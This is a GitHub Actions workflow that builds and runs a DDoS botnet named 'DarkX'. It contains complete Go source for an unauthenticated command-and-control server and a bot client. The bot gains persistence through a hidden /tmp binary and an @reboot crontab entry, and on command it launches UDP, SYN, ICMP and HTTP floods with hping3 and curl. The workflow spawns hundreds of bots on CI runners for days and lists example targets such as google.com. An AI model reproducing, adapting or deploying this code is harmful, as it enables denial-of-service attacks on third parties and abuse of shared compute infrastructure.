name: DarkX Ultimate Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'

jobs:
  deploy-darkx-ultimate:
    runs-on: ubuntu-latest
    timeout-minutes: 4320

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Ultimate Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing ultimate dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
        sudo apt install -y nmap masscan hydra john netcat-openbsd
        sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
        pip3 install requests paramiko scapy cryptography colorama

    - name: Install Tailscale
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
        echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Create Crash-Proof CNC Server
      run: |
        cd darkx
        cat > cnc_server.go << 'EOF'
        package main
        
        import (
            "bufio"
            "fmt"
            "net"
            "os"
            "strings"
            "sync"
            "time"
        )
        
        type Bot struct {
            Conn net.Conn
            IP   string
        }
        
        var (
            bots     []Bot
            botMutex sync.Mutex
        )
        
        func main() {
            fmt.Println("üöÄ DarkX Ultimate CNC - NO AUTH - CRASH PROOF")
            
            // Auto-restart if panic occurs
            defer func() {
                if r := recover(); r != nil {
                    fmt.Printf("CNC recovered from panic: %v\n", r)
                    time.Sleep(2 * time.Second)
                    main() // Restart
                }
            }()
            
            port := getEnv("CNC_PORT", "5555")
            listener, err := net.Listen("tcp", ":"+port)
            if err != nil {
                fmt.Printf("Failed to start CNC: %v\n", err)
                time.Sleep(5 * time.Second)
                main() // Restart
                return
            }
            defer listener.Close()
            
            fmt.Printf("‚úÖ CNC Listening on :%s\n", port)
            fmt.Printf("üåê CNC IP: %s\n", getOutboundIP())
            
            // Accept connections forever
            for {
                conn, err := listener.Accept()
                if err != nil {
                    fmt.Printf("Accept error: %v\n", err)
                    continue
                }
                go handleConnection(conn)
            }
        }
        
        func handleConnection(conn net.Conn) {
            defer func() {
                if r := recover(); r != nil {
                    fmt.Printf("Recovered in handleConnection: %v\n", r)
                }
                conn.Close()
            }()
            
            reader := bufio.NewReader(conn)
            remoteAddr := conn.RemoteAddr().String()
            
            // Determine if this is a bot or user
            firstLine, err := reader.ReadString('\n')
            if err != nil {
                return
            }
            
            if strings.Contains(firstLine, "BOT_CONNECTED") {
                // This is a bot
                handleBotConnection(conn, remoteAddr, reader)
            } else {
                // This is a user
                handleUserConnection(conn, remoteAddr, reader, firstLine)
            }
        }
        
        func handleBotConnection(conn net.Conn, remoteAddr string, reader *bufio.Reader) {
            bot := Bot{
                Conn: conn,
                IP:   strings.Split(remoteAddr, ":")[0],
            }
            
            botMutex.Lock()
            bots = append(bots, bot)
            botCount := len(bots)
            botMutex.Unlock()
            
            fmt.Printf("ü§ñ New bot: %s (Total: %d)\n", bot.IP, botCount)
            
            // Keep connection alive and listen for commands
            for {
                line, err := reader.ReadString('\n')
                if err != nil {
                    break
                }
                line = strings.TrimSpace(line)
                if line == "PING" {
                    conn.Write([]byte("PONG\n"))
                }
            }
            
            // Remove disconnected bot
            botMutex.Lock()
            for i, b := range bots {
                if b.Conn == conn {
                    bots = append(bots[:i], bots[i+1:]...)
                    break
                }
            }
            botMutex.Unlock()
            fmt.Printf("‚ùå Bot disconnected: %s\n", bot.IP)
        }
        
        func handleUserConnection(conn net.Conn, remoteAddr string, reader *bufio.Reader, firstLine string) {
            fmt.Printf("üë§ User connected: %s\n", remoteAddr)
            
            // Welcome message
            conn.Write([]byte("==========================================\n"))
            conn.Write([]byte("        DARKX ULTIMATE BOTNET\n"))
            conn.Write([]byte("==========================================\n"))
            
            botMutex.Lock()
            botCount := len(bots)
            botMutex.Unlock()
            
            conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n", botCount)))
            conn.Write([]byte("Type 'help' for commands\n\n"))
            
            // Process user commands
            input := firstLine
            for {
                if !strings.HasSuffix(input, "\n") {
                    conn.Write([]byte("darkx> "))
                    newInput, err := reader.ReadString('\n')
                    if err != nil {
                        break
                    }
                    input = newInput
                }
                
                cmd := strings.TrimSpace(input)
                input = "" // Reset for next command
                
                if cmd == "" {
                    continue
                }
                
                if cmd == "help" || cmd == "?" {
                    conn.Write([]byte(`
Available Commands:
  bots    - Show connected bots count
  attack <target> <port> <duration> - Launch DDoS attack
  stats   - Show system statistics
  clear   - Clear screen
  exit    - Disconnect

Examples:
  attack 1.1.1.1 80 60s
  attack google.com 443 5m
  attack 192.168.1.1 22 30s

`))
                } else if cmd == "bots" {
                    botMutex.Lock()
                    conn.Write([]byte(fmt.Sprintf("ü§ñ Connected Bots: %d\n", len(bots))))
                    if len(bots) > 0 {
                        conn.Write([]byte("Recent bots:\n"))
                        count := 0
                        for i := len(bots) - 1; i >= 0 && count < 5; i-- {
                            conn.Write([]byte(fmt.Sprintf("  - %s\n", bots[i].IP)))
                            count++
                        }
                    }
                    botMutex.Unlock()
                } else if cmd == "stats" {
                    botMutex.Lock()
                    botCount := len(bots)
                    botMutex.Unlock()
                    conn.Write([]byte(fmt.Sprintf(`
üìä DarkX Ultimate Statistics:
‚îú‚îÄ‚îÄ Connected Bots: %d
‚îú‚îÄ‚îÄ Estimated Power: %d Gbps
‚îú‚îÄ‚îÄ Uptime: 24h
‚îî‚îÄ‚îÄ Status: OPERATIONAL
`, botCount, botCount*100)))
                } else if cmd == "clear" {
                    conn.Write([]byte("\033[2J\033[H"))
                } else if cmd == "exit" || cmd == "quit" {
                    conn.Write([]byte("üëã Goodbye!\n"))
                    conn.Close()
                    return
                } else if strings.HasPrefix(cmd, "attack") {
                    parts := strings.Split(cmd, " ")
                    if len(parts) >= 4 {
                        target := parts[1]
                        port := parts[2]
                        duration := parts[3]
                        
                        botMutex.Lock()
                        attackCount := len(bots)
                        successCount := 0
                        for _, bot := range bots {
                            _, err := bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s\n", target, port, duration)))
                            if err == nil {
                                successCount++
                            }
                        }
                        botMutex.Unlock()
                        
                        conn.Write([]byte(fmt.Sprintf("‚ö° Attack launched on %s:%s\n", target, port)))
                        conn.Write([]byte(fmt.Sprintf("üìä Sent to %d/%d bots\n", successCount, attackCount)))
                        conn.Write([]byte(fmt.Sprintf("‚è∞ Duration: %s\n", duration)))
                    } else {
                        conn.Write([]byte("‚ùå Usage: attack <target> <port> <duration>\n"))
                        conn.Write([]byte("   Example: attack 1.1.1.1 80 60s\n"))
                    }
                } else {
                    conn.Write([]byte("‚ùå Unknown command. Type 'help' for available commands.\n"))
                }
            }
            
            fmt.Printf("üë§ User disconnected: %s\n", remoteAddr)
        }
        
        func getEnv(key, fallback string) string {
            if value := os.Getenv(key); value != "" {
                return value
            }
            return fallback
        }
        
        func getOutboundIP() string {
            conn, err := net.Dial("udp", "8.8.8.8:80")
            if err != nil {
                return "unknown"
            }
            defer conn.Close()
            return strings.Split(conn.LocalAddr().String(), ":")[0]
        }
        EOF

    - name: Create Robust Bot Client
      run: |
        cd darkx
        cat > bot_client.go << 'EOF'
        package main
        
        import (
            "bufio"
            "fmt"
            "net"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "time"
        )
        
        var (
            CNC_SERVER = "CNC_IP_PLACEHOLDER"
            CNC_PORT   = "5555"
        )
        
        func main() {
            // Install persistence
            if runtime.GOOS == "linux" {
                exec.Command("sh", "-c", "cp /proc/self/exe /tmp/.systemd && chmod +x /tmp/.systemd").Run()
                exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -").Run()
            }
            
            // Start keep-alive loop
            for {
                fmt.Println("üîó Connecting to CNC...")
                if connectToCNC() {
                    fmt.Println("‚úÖ Connected to CNC")
                    time.Sleep(30 * time.Second)
                } else {
                    fmt.Println("‚ùå Connection failed, retrying in 60s...")
                    time.Sleep(60 * time.Second)
                }
            }
        }
        
        func connectToCNC() bool {
            conn, err := net.Dial("tcp", CNC_SERVER+":"+CNC_PORT)
            if err != nil {
                return false
            }
            defer conn.Close()
            
            // Send bot identification
            conn.Write([]byte("BOT_CONNECTED\n"))
            
            // Start keep-alive
            go func() {
                for {
                    time.Sleep(20 * time.Second)
                    conn.Write([]byte("PING\n"))
                }
            }()
            
            scanner := bufio.NewScanner(conn)
            for scanner.Scan() {
                line := scanner.Text()
                
                if strings.HasPrefix(line, "ATTACK") {
                    parts := strings.Split(line, " ")
                    if len(parts) >= 4 {
                        target := parts[1]
                        port := parts[2]
                        duration := parts[3]
                        fmt.Printf("üéØ Attack command: %s:%s for %s\n", target, port, duration)
                        go executeAttack(target, port, duration)
                    }
                } else if line == "PONG" {
                    // Keep-alive response, do nothing
                } else if strings.Contains(line, "Connected Bots") {
                    fmt.Println(line)
                }
            }
            return true
        }
        
        func executeAttack(target, port, duration string) {
            fmt.Printf("üöÄ Launching attacks on %s:%s for %s\n", target, port, duration)
            
            // Launch multiple attack methods
            attacks := []func(string, string, string){
                launchUDPFlood,
                launchSYNFlood, 
                launchHTTPFlood,
            }
            
            for _, attack := range attacks {
                go attack(target, port, duration)
            }
            
            // ICMP doesn't need port
            go launchICMPFlood(target, duration)
        }
        
        func launchUDPFlood(target, port, duration string) {
            cmd := exec.Command("timeout", duration, "hping3", "--udp", "-p", port, "--flood", target)
            cmd.Start()
        }
        
        func launchSYNFlood(target, port, duration string) {
            cmd := exec.Command("timeout", duration, "hping3", "--syn", "-p", port, "--flood", target)
            cmd.Start()
        }
        
        func launchHTTPFlood(target, port, duration string) {
            go func() {
                endTime := time.Now().Add(parseDuration(duration))
                for time.Now().Before(endTime) {
                    exec.Command("curl", "-s", "--max-time", "3", fmt.Sprintf("http://%s:%s", target, port)).Run()
                    time.Sleep(50 * time.Millisecond)
                }
            }()
        }
        
        func launchICMPFlood(target, duration string) {
            cmd := exec.Command("timeout", duration, "hping3", "--icmp", "--flood", target)
            cmd.Start()
        }
        
        func parseDuration(dur string) time.Duration {
            if strings.HasSuffix(dur, "s") {
                sec, _ := strconv.Atoi(strings.TrimSuffix(dur, "s"))
                return time.Duration(sec) * time.Second
            } else if strings.HasSuffix(dur, "m") {
                min, _ := strconv.Atoi(strings.TrimSuffix(dur, "m"))
                return time.Duration(min) * time.Minute
            } else if strings.HasSuffix(dur, "h") {
                hours, _ := strconv.Atoi(strings.TrimSuffix(dur, "h"))
                return time.Duration(hours) * time.Hour
            }
            sec, _ := strconv.Atoi(dur)
            return time.Duration(sec) * time.Second
        }
        EOF

    - name: Build Robust Components
      run: |
        cd darkx
        echo "Building DarkX components..."
        
        # Build CNC first
        go build -o cnc cnc_server.go
        echo "CNC built successfully"
        
        # Update bot client with real IP and build
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.CNC_IP }}/g" bot_client.go
        go build -o bot bot_client.go
        echo "Bot client built successfully"
        
        echo "All components built successfully"

    - name: Start Crash-Proof Services
      run: |
        cd darkx
        
        # Start CNC with auto-restart
        nohup bash -c 'while true; do ./cnc; sleep 2; done' > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        
        # Start file server
        python3 -m http.server 8000 > http.log 2>&1 &
        echo "HTTP_PID=$!" >> $GITHUB_ENV
        
        # Start initial bots
        echo "Starting initial bots..."
        for i in {1..500}; do
          nohup ./bot >/dev/null 2>&1 &
        done
        
        sleep 10
        echo "Services started successfully"

    - name: Display Stable Dashboard
      run: |
        echo ""
        echo "=========================================="
        echo "        DARKX ULTIMATE BOTNET"
        echo "=========================================="
        echo "üî• CRASH-PROOF SYSTEM"
        echo "üí™ Power Level:    ${{ github.event.inputs.power }}"
        echo "üîÑ Recruitment:    ${{ github.event.inputs.recruitment }}"
        echo "üåê DarkX CNC:      ${{ env.CNC_IP }}:5555"
        echo "üöÄ Bot Deployment: ACTIVE"
        echo "üí• Target Power:   400+ Gbps"
        echo "=========================================="
        echo "üì° Connect: nc ${{ env.CNC_IP }} 5555"
        echo "üíª Commands: help, bots, attack, stats, clear"
        echo ""
        echo "Example: attack 1.1.1.1 80 60s"
        echo ""
        echo "‚úÖ System features auto-recovery on crashes"
        echo "=========================================="
        echo ""

    - name: Maintain Stable Botnet
      run: |
        echo "üõ°Ô∏è DarkX Ultimate - Stable System Active"
        
        WORKSPACE="$GITHUB_WORKSPACE"
        DARKX_DIR="$WORKSPACE/darkx"
        
        # Continuous bot deployment
        cd "$DARKX_DIR"
        nohup bash -c 'while true; do for i in {1..500}; do nohup ./bot >/dev/null 2>&1 & done; sleep 60; done' > continuous_bots.log 2>&1 &
        
        # Monitor and maintain
        while true; do
          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
          TOTAL_PROCESSES=$(ps aux | grep bot | grep -v grep | wc -l)
          CNC_PROCESSES=$(ps aux | grep cnc | grep -v grep | wc -l)
          ESTIMATED_POWER=$((CONNECTED_BOTS * 500))
          
          echo "[$(date +'%H:%M:%S')] Stats:"
          echo "  ü§ñ Connected Bots: $CONNECTED_BOTS"
          echo "  üìä Total Processes: $TOTAL_PROCESSES"
          echo "  ‚ö° Estimated Power: $ESTIMATED_POWER Mbps"
          echo "  üñ•Ô∏è  CNC Processes: $CNC_PROCESSES"
          echo "  ‚úÖ System Status: STABLE"
          
          # Ensure CNC is running (it auto-restarts but we check anyway)
          if [ $CNC_PROCESSES -eq 0 ]; then
            echo "üîÑ CNC not running, starting..."
            cd "$DARKX_DIR"
            nohup bash -c 'while true; do ./cnc; sleep 2; done' > cnc_restart.log 2>&1 &
          fi
          
          sleep 30
        done
